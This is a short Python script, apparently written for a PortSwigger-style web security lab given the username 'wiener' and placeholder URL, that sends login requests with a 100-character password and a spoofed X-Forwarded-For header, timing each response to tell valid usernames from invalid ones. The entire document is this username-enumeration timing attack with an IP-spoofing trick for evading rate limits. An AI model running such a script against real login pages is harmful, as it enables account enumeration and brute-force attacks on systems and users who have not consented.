python3 - <<'EOF'
import requests
import time

base_url = "URL"
long_pass = "A" * 100

for username in ["fakeuser123", "wiener"]:
    start = time.time()
    r = requests.post(
        f"{base_url}/login",
        data={"username": username, "password": long_pass},
        headers={"X-Forwarded-For": "1.2.3.4"},
    )
    elapsed = time.time() - start
    print(f"{username} → {elapsed:.3f}s | {r.status_code}")
EOF
